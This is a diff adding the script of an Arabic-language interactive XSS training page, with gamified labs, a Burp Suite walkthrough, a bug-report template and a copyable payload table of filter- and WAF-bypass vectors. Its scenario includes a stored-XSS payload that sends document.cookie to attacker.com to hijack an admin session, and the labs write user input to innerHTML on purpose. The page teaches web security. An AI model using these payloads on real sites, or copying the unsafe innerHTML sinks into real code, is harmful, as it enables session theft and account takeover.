+    reflected: { title: 'Reflected XSS', body: 'الكود يُعاد انعكاسه من الـ request في الـ response مباشرة. يحتاج المهاجم لإقناع الضحية بالنقر على رابط مُعدّ. مثال: رابط بحث يحتوي payload.' },
+    stored: { title: 'Stored XSS', body: 'الكود يُخزَّن في قاعدة البيانات ويُنفَّذ تلقائياً لكل من يرى المحتوى. أخطر أنواع XSS لأنه لا يحتاج تفاعلاً من الضحية.' },
+    dom: { title: 'DOM-Based XSS', body: 'الثغرة تكون في JavaScript الجانب العميل فقط. بيانات تأتي من Source (location.hash) وتذهب إلى Sink (innerHTML) بدون تمرير الـ server.' },
+    getpost: { title: 'GET / POST Parameters', body: 'Reflected XSS يكون عادةً في GET params (في الـ URL) أو POST body (في الـ Forms). ابحث عن أي parameter تُعكس في الـ response.' },
+    filter: { title: 'Filter Bypass', body: 'كثير من التطبيقات تُفلتر <script> فقط. التحايل يكون بـ event handlers مثل onerror أو بـ encodings مثل HTML entities.' },
+    waf: { title: 'WAF Bypass', body: 'جدران الحماية تستخدم patterns — يمكن تجاوزها بـ case variation، mixed encoding، أو polyglot payloads.' },
+    database: { title: 'Database Storage', body: 'Stored XSS يُخزَّن في DB ثم يُسترجع ويُعرض لاحقاً. كل مستخدم يرى المحتوى يتأثر تلقائياً.' },
+    adminview: { title: 'Admin View', body: 'الهدف المثالي للـ Stored XSS — إذا نفّذ payload على مشرف النظام، يمكن الاستيلاء على حسابه ذي الصلاحيات الكاملة.' },
+    javascript: { title: 'JavaScript Engine', body: 'المتصفح يُنفّذ أي JavaScript يجده في الصفحة بصلاحيات الـ origin — لهذا XSS خطير جداً.' },
+    sourcesink: { title: 'Source → Sink Flow', body: 'Source: بيانات يتحكم فيها المهاجم. Sink: دالة تُنفّذ الكود. DOM XSS يحدث عندما تتدفق البيانات من source إلى sink بدون تطهير.' },
+  };
+
+  function showMapDetail(key) {
+    const detail = document.getElementById('map-detail');
+    const content = document.getElementById('map-detail-content');
+    const data = mapData[key];
+    content.innerHTML = `<strong style="color:var(--cyan);font-size:1rem;">${data.title}</strong><p style="color:var(--subtle);font-size:0.88rem;margin-top:8px;line-height:1.7;">${data.body}</p>`;
+    detail.style.display = 'block';
+    detail.classList.add('visible');
+  }
+
+  // ── STEPPER ──
+  const stepData = [
+    { title: 'Capture Request', body: 'افتح Burp Suite وفعّل Intercept. اضغط على أي action في الموقع — الـ request سيظهر. ابحث عن Parameters تُعكس في الـ response.' },
+    { title: 'Find Input', body: 'في الـ request ابحث عن كل parameter قد يظهر محتواها في الـ response: search, q, name, id, msg, comment, bio, redirect...' },
+    { title: 'Modify Parameter', body: 'أرسل الـ request لـ Repeater. غيّر قيمة الـ parameter بـ marker مميز مثل XSSTEST. أرسل وابحث عن الـ marker في الـ response.' },
+    { title: 'Observe Reflection', body: 'إذا وجدت marker في الـ response — ممتاز! لاحظ: هل يظهر كنص عادي؟ داخل attribute؟ داخل كود JavaScript؟ هذا يحدد نوع الـ payload.' },
+    { title: 'Identify Context', body: 'السياق هو المفتاح: HTML Body → استخدم <script>. Attribute → أغلق الـ attribute أولاً. JS String → أغلق الـ string. URL → استخدم javascript: protocol.' },
+    { title: 'Test Impact', body: 'ابدأ بـ alert(1) للتأكيد ثم صعّد: document.cookie لسرقة الـ session، fetch لإرسال البيانات لسيرفر خارجي، أو تنفيذ Admin actions.' },
+  ];
+
+  function showStep(idx) {
+    const steps = document.querySelectorAll('.step-item');
+    steps.forEach((s, i) => {
+      s.classList.remove('active', 'done');
+      if (i < idx) s.classList.add('done');
+      if (i === idx) s.classList.add('active');
+    });
+    const d = stepData[idx];
+    const detail = document.getElementById('step-detail');
+    detail.innerHTML = `<strong style="color:var(--cyan);">الخطوة ${idx+1}: ${d.title}</strong><p style="color:var(--subtle);font-size:0.88rem;margin-top:8px;line-height:1.6;">${d.body}</p>`;
+    detail.classList.add('visible');
+  }
+
+  // ── LAB SWITCH ──
+  function switchLab(idx, btn) {
+    document.querySelectorAll('.lab-area').forEach(a => a.classList.remove('active'));
+    document.querySelectorAll('.lab-tab').forEach(b => b.classList.remove('active'));
+    document.getElementById('lab-' + idx).classList.add('active');
+    btn.classList.add('active');
+  }
+
+  // ── LEVEL 1 ──
+  function updateL1() {
+    const v = document.getElementById('l1-input').value;
+    document.getElementById('l1-url-preview').textContent = encodeURIComponent(v).substring(0, 40);
+    document.getElementById('l1-output').textContent = v;
+  }
+  function submitL1() {
+    const v = document.getElementById('l1-input').value;
+    const out = document.getElementById('l1-result');
+    out.innerHTML = v;
+    if (!labsSolved[0] && (v.includes('<script>') || v.includes('onerror') || v.includes('onload') || v.includes('onclick'))) {
+      labsSolved[0] = true;
+      addXP(xpRewards[0], 'Level 1 Solved!');
+      showToast('🎉 Level 1 محلولة! +100 XP');
+    }
+  }
+
+  // ── LEVEL 2 ──
+  function updateL2() {
+    const v = document.getElementById('l2-input').value;
+    document.getElementById('l2-preview').textContent = `<input value="${v}">`;
+  }
+  function submitL2() {
+    const v = document.getElementById('l2-input').value;
+    const res = document.getElementById('l2-result');
+    if (!labsSolved[1] && (v.includes('"') || v.includes("'")) && (v.includes('on') || v.includes('alert'))) {
+      labsSolved[1] = true;
+      addXP(xpRewards[1], 'Level 2 Solved!');
+      res.innerHTML = '<span style="color:var(--green);">✅ تم كسر الـ Attribute Context! +150 XP</span>';
+    } else {
+      res.innerHTML = '<span style="color:var(--muted);">جرب إغلاق الـ attribute أولاً...</span>';
+    }
+  }
+
+  // ── LEVEL 3 ──
+  function updateL3() {
+    const v = document.getElementById('l3-input').value;
+    document.getElementById('l3-preview').textContent = `var username = "${v}";`;
+  }
+  function submitL3() {
+    const v = document.getElementById('l3-input').value;
+    const res = document.getElementById('l3-result');
+    if (!labsSolved[2] && v.includes('"') && (v.includes('alert') || v.includes('fetch') || v.includes('console'))) {
+      labsSolved[2] = true;
+      addXP(xpRewards[2], 'Level 3 Solved!');
+      res.innerHTML = '<span style="color:var(--green);">✅ تم كسر الـ JS Context! +200 XP</span>';
+    } else {
+      res.innerHTML = '<span style="color:var(--muted);">جرب إغلاق الـ JS string أولاً...</span>';
+    }
+  }
+
+  // ── LEVEL 4 ──
+  function updateL4() {
+    const v = document.getElementById('l4-input').value;
+    document.getElementById('l4-display').innerHTML = v || 'مرحباً بك!';
+  }
+  function submitL4() {
+    const v = document.getElementById('l4-input').value;
+    const res = document.getElementById('l4-result');
+    document.getElementById('l4-display').innerHTML = v;
+    if (!labsSolved[3] && (v.includes('onerror') || v.includes('onload') || v.includes('<script>') || v.includes('alert'))) {
+      labsSolved[3] = true;
+      addXP(xpRewards[3], 'Level 4 Solved!');
+      res.innerHTML = '<span style="color:var(--green);">✅ DOM XSS Achieved! +300 XP</span>';
+    }
+  }
+
+  // ── HINTS ──
+  function toggleHint(id, btn) {
+    const el = document.getElementById(id);
+    el.classList.toggle('open');
+    const icon = btn.querySelector('i');
+    icon.className = el.classList.contains('open') ? 'bx bx-chevron-up' : 'bx bx-chevron-down';
+  }
+
+  // ── SURFACE EXPAND ──
+  function expandSurface(card, name) {
+    const detail = card.querySelector('.surface-detail');
+    detail.style.display = detail.style.display === 'none' ? 'block' : 'none';
+  }
+
+  // ── SCENARIO ──
+  const scenarioData = [
+    { title: '1. تعديل الـ Bio', body: 'اذهب لصفحة Edit Profile وأدخل في حقل Bio: <code>&lt;script&gt;fetch("https://attacker.com/?c="+document.cookie)&lt;/script&gt;</code>' },
+    { title: '2. حقن الـ Payload', body: 'الـ Payload يُخزَّن مباشرة في DB بدون HTML encoding. الخادم يقبل الـ input كما هو.' },
+    { title: '3. حفظ في قاعدة البيانات', body: 'تم حفظ payload في جدول users في عمود bio. سيُسترجع ويُعرض لكل من يزور الصفحة.' },
+    { title: '4. المشرف يرى الملف الشخصي', body: 'عندما يفتح Admin صفحة مراجعة الحسابات الجديدة، يُرسل المتصفح كوكيز المشرف تلقائياً لـ attacker.com.' },
+    { title: '5. تنفيذ الـ Payload', body: 'الـ payload يُنفَّذ في سياق المشرف — يُرسل الـ session cookie لسيرفر المهاجم.' },
+    { title: '6. الاستيلاء على الحساب', body: 'المهاجم يستخدم الـ session cookie للدخول كمشرف كامل الصلاحيات. التطبيق يقبله لأن الـ cookie صحيح.' },
+  ];
+
+  function showScenario(idx) {
+    const d = scenarioData[idx];
+    document.getElementById('scenario-detail').innerHTML = `<strong style="color:var(--orange);">${d.title}</strong><p style="color:var(--subtle);font-size:0.88rem;margin-top:8px;line-height:1.6;">${d.body}</p>`;
+    document.getElementById('scenario-detail').classList.add('visible');
+  }
+
+  // ── IMPACT ──
+  function showImpact(key) {
+    const el = document.getElementById('impact-' + key);
+    el.style.display = el.style.display === 'none' ? 'block' : 'none';
+  }
+
+  // ── REPORT ──
+  function generateReport() {
+    const title = document.getElementById('r-title').value || '[عنوان الثغرة]';
+    const summary = document.getElementById('r-summary').value || '[ملخص الثغرة]';
+    const steps = document.getElementById('r-steps').value || '[خطوات الإعادة]';
+    const impact = document.getElementById('r-impact').value || '[التأثير]';
+    const severity = document.getElementById('r-severity').value;
+    const fix = document.getElementById('r-fix').value || '[الإصلاح المقترح]';
+
+    const report = `# Bug Report: ${title}
+
+## Summary
+${summary}
+
+## Severity
+${severity}
+
+## Steps to Reproduce
+${steps}
+
+## Impact
+${impact}
+
+## Remediation
+${fix}
+
+---
+Reported by: Abdo (Abdo Cyber Academy)
+Platform: HackerOne / BugCrowd
+Date: ${new Date().toLocaleDateString('ar-EG')}`;
+
+    const out = document.getElementById('report-output');
+    out.textContent = report;
+    out.style.opacity = '1';
+    out.style.color = 'var(--text)';
+    out.classList.add('visible');
+    addXP(200, 'كتابة تقرير احترافي');
+    showToast('📝 تم توليد التقرير! +200 XP');
+  }
+
+  function copyReport() {
+    const text = document.getElementById('report-output').textContent;
+    navigator.clipboard.writeText(text);
+    showToast('✅ تم نسخ التقرير بنجاح!');
+  }
+
+  // ── PAYLOADS ──
+  const payloads = [
+    { level: '🟢 Beginner', payload: '<script>alert(1)<\/script>', ctx: 'HTML Body', goal: 'أساسي', color: 'green' },
+    { level: '🟢 Beginner', payload: '<img src=x onerror=alert(1)>', ctx: 'HTML Body', goal: 'تجاوز فلتر script', color: 'green' },
+    { level: '🔵 Intermediate', payload: '" onmouseover="alert(1)', ctx: 'Attribute', goal: 'كسر attribute', color: 'cyan' },
+    { level: '🔵 Intermediate', payload: "' onfocus='alert(1)", ctx: 'Attribute', goal: 'single-quote escape', color: 'cyan' },
+    { level: '🔵 Intermediate', payload: '<svg onload=alert(1)>', ctx: 'HTML Body', goal: 'SVG vector', color: 'cyan' },
+    { level: '🟠 Advanced', payload: '";alert(1)//', ctx: 'JS String', goal: 'كسر JS context', color: 'orange' },
+    { level: '🟠 Advanced', payload: '</script><script>alert(1)<\/script>', ctx: 'JS Block', goal: 'إغلاق script tag', color: 'orange' },
+    { level: '🟠 Advanced', payload: 'javascript:alert(1)', ctx: 'href/src', goal: 'URL injection', color: 'orange' },
+    { level: '🔴 Expert', payload: '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', ctx: 'WAF Bypass', goal: 'Base64 encode', color: 'red' },
+    { level: '🔴 Expert', payload: '<input autofocus onfocus=alert(1)>', ctx: 'Filtered', goal: 'Autofocus event', color: 'red' },
+    { level: '🔴 Expert', payload: '<%2fscript><script>alert(1)<%2fscript>', ctx: 'URL Encoded', goal: 'Encoded WAF bypass', color: 'red' },
+  ];
+
+  const tbody = document.getElementById('payload-tbody');
+  payloads.forEach(p => {
+    const tr = document.createElement('tr');
+    tr.innerHTML = `
+      <td><span class="tag ${p.color}">${p.level}</span></td>
+      <td><code style="font-size:0.78rem;background:var(--bg);padding:4px 8px;border-radius:4px;border:1px solid var(--border);display:block;">${p.payload.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</code></td>
+      <td><span class="tag cyan" style="font-size:0.72rem;">${p.ctx}</span></td>
+      <td style="color:var(--muted);font-size:0.82rem;">${p.goal}</td>
+      <td><button class="copy-btn" onclick="copyPayload(this,'${p.payload.replace(/'/g,"\\'")}')"><i class='bx bx-copy'></i> نسخ</button></td>
+    `;
+    tbody.appendChild(tr);
+  });
+
+  function copyPayload(btn, text) {
+    navigator.clipboard.writeText(text);
+    btn.innerHTML = "<i class='bx bx-check'></i> تم";
+    setTimeout(() => btn.innerHTML = "<i class='bx bx-copy'></i> نسخ", 2000);
+    showToast('✅ تم نسخ الـ Payload!');
+  }
+
+  // ── TOAST ──
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.style.display = 'block';
+    setTimeout(() => t.style.display = 'none', 2500);
+  }
+</script>
+</body>
+</html>
